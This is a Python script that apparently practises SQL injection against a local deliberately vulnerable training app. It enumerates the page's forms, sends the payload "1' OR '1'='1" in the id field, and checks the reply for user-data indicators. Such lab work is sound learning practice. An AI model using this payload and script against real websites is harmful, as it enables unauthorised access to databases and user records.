import requests
from bs4 import BeautifulSoup

session = requests.Session()
session.cookies.update({
    "PHPSESSID": "2k8bp87motil60un18lu5sg0p7",
    "security":  "low"
})

# Fetch the page
response = session.get("http://127.0.0.1/vulnerabilities/sqli/")
soup     = BeautifulSoup(response.text, "html.parser")

# Show all forms
print("=== FORMS FOUND ===")
for form in soup.find_all("form"):
    print(f"Action : {form.get('action')}")
    print(f"Method : {form.get('method')}")
    for inp in form.find_all("input"):
        print(f"  Input: name={inp.get('name')} type={inp.get('type')}")

# Try payload manually
print("\n=== MANUAL SQL TEST ===")
payload  = "1' OR '1'='1"
response = session.get(
    "http://127.0.0.1/vulnerabilities/sqli/",
    params={"id": payload, "Submit": "Submit"}
)
print(f"Status : {response.status_code}")
print(f"Length : {len(response.text)}")

# Check for success indicators
indicators = ["first name", "surname", "admin", "user"]
for ind in indicators:
    if ind in response.text.lower():
        print(f"✓ Found indicator: '{ind}' — SQL INJECTION WORKS!")

print("\n=== RESPONSE SNIPPET ===")
print(response.text[2000:3000])